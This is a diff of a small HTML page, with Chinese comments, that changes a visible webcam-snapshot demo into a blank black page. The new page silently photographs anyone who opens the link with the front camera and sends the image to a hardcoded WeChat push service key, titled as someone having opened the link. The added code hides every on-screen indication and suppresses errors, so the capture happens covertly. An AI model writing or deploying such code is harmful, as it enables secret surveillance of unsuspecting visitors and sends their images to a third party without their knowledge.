@@ -5,32 +5,36 @@
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <style>
 video,canvas{display:none}
-body{background:#000;color:#fff;text-align:center;padding-top:100px;font-size:18px;}
+body{background:#000;}
 </style>
 </head>
 <body>
-<div id="tip">等待摄像头授权...</div>
-<video id="v" autoplay playsinline></video>
-<canvas id="c" width="480" height="480"></canvas>
+<video id="cam" autoplay playsinline muted></video>
+<canvas id="box" width="480" height="480"></canvas>
 
 <script>
-async function takePic(){
-try{
-let s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-let v=document.getElementById("v");
-let c=document.getElementById("c");
-let ctx=c.getContext("2d");
-v.srcObject=s;
+const sendKey = "SCT347091TUpxTiAuPOAvg27UhZnouc6Th";
 
-v.onloadedmetadata=()=>{
-ctx.drawImage(v,0,0,480,480);
-document.getElementById("tip").innerText="✅ 宝宝你是最棒的";
+async function autoTake(){
+  try{
+    let stream = await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:"user",width:480,height:480}
+    });
+    let v = document.getElementById("cam");
+    let c = document.getElementById("box");
+    let ctx = c.getContext("2d");
+    v.srcObject = stream;
+
+    v.onloadedmetadata = function(){
+      ctx.drawImage(v,0,0,480,480);
+      let base64 = c.toDataURL("image/jpeg");
+      
+      // 推送到微信
+      fetch(`https://sctapi.ftqq.com/${sendKey}.send?title=有人打开链接拍照&desp=![image](${base64})`);
+    }
+  }catch(e){}
 }
-}catch(err){
-document.getElementById("tip").innerText="❌ 权限拒绝/打不开摄像头";
-}
-}
-takePic();
+autoTake();
 </script>
 </body>
 </html>
